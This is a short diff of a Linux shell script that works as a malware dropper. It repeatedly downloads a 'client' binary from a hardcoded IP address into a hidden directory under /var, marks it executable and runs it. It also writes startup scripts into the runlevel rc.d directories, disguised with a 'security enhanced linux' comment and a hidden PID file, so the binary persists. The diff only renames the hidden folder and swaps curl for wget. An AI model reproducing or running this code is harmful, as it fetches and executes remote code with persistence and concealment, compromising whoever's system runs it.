@@ -11,11 +11,10 @@ current_runlevel=`runlevel | cut -d ' ' -f 2`
 current_rc_d="/etc/rc$current_runlevel.d/"
 
 self=`basename $0`
-base_location="/var/.selinux/"
-tmp_file="/tmp/.client"
+base_location="/var/.alex/"
 default_url="http://198.211.0.204/client"
 url=""
-mydownloader=`which curl`
+mydownloader=`which wget`
 declare -i status=1
 
 mkdir -p $base_location
@@ -29,10 +28,10 @@ fi
 while [ $status -ne 0 ]
 do
     rm -rf $tmp_file
-    $mydownloader $url >$tmp_file 2>/dev/null
+    $mydownloader $url 2>/dev/null
     status=$?
 done
-cp -f $tmp_file $base_location/client
+cp -f ./client $base_location/client
 chmod a+x $base_location/client
 $base_location/client
 rm -rf $tmp_file
@@ -49,7 +48,7 @@ do
         echo "#security enhanced linux" >> $new_S_file_name
         echo '
 PATH=/bin:/usr/bin:/sbin:/usr/sbin
-DAEMON=/var/.selinux/client
+DAEMON=/var/.alex/client
 PIDFILE=/var/run/.selinux.pid
 
 test -x $DAEMON || exit 0
